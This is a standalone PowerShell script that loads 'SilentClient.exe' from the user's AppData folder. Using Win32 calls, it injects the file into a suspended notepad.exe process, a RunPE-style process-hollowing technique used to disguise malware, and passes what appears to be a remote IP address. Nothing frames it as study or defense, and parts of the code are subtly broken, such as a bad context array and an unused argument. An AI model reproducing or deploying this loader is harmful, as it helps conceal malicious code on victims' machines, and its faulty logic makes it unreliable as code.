
# === Read EXE from %APPDATA% as bytes ===
$exePath = "$env:APPDATA\SilentClient.exe"
$bytes = [System.IO.File]::ReadAllBytes($exePath)

# === Allocate memory and inject bytes into new process using RunPE-like method ===

function Run-EXEFromMemory {
    param(
        [Byte[]]$PEBytes,
        [String]$Argument
    )

    $pi = New-Object PROCESS_INFORMATION
    $si = New-Object STARTUPINFO
    $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
    $cmd = "C:\Windows\System32\notepad.exe"

    $created = [Win32.Native+Kernel32]::CreateProcess($cmd, $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x4, [IntPtr]::Zero, [System.IO.Path]::GetDirectoryName($cmd), [ref]$si, [ref]$pi)
    if (-not $created) {
        throw "CreateProcess failed"
    }

    $context = New-Object Byte[] 1232
    $context[0] = 0x10001

    $threadHandle = $pi.hThread
    $procHandle = $pi.hProcess

    $addr = [Win32.Native+Kernel32]::VirtualAllocEx($procHandle, [IntPtr]::Zero, $PEBytes.Length, 0x3000, 0x40)
    [IntPtr]$written = [IntPtr]::Zero

    [Win32.Native+Kernel32]::WriteProcessMemory($procHandle, $addr, $PEBytes, $PEBytes.Length, [ref]$written)

    [Win32.Native+Kernel32]::SetThreadContext($threadHandle, $context)
    [Win32.Native+Kernel32]::ResumeThread($threadHandle)
}

# Define structs and APIs
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct STARTUPINFO {
    public UInt32 cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public UInt32 dwX;
    public UInt32 dwY;
    public UInt32 dwXSize;
    public UInt32 dwYSize;
    public UInt32 dwXCountChars;
    public UInt32 dwYCountChars;
    public UInt32 dwFillAttribute;
    public UInt32 dwFlags;
    public UInt16 wShowWindow;
    public UInt16 cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
}

[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION {
    public IntPtr hProcess;
    public IntPtr hThread;
    public UInt32 dwProcessId;
    public UInt32 dwThreadId;
}

public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        UInt32 dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        int dwSize,
        uint flAllocationType,
        uint flProtect
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int nSize,
        out IntPtr lpNumberOfBytesWritten
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool SetThreadContext(IntPtr hThread, byte[] lpContext);
}
"@ -Namespace Win32 -Name Native

# === Execute ===
Run-EXEFromMemory -PEBytes $bytes -Argument "185.201.252.130"
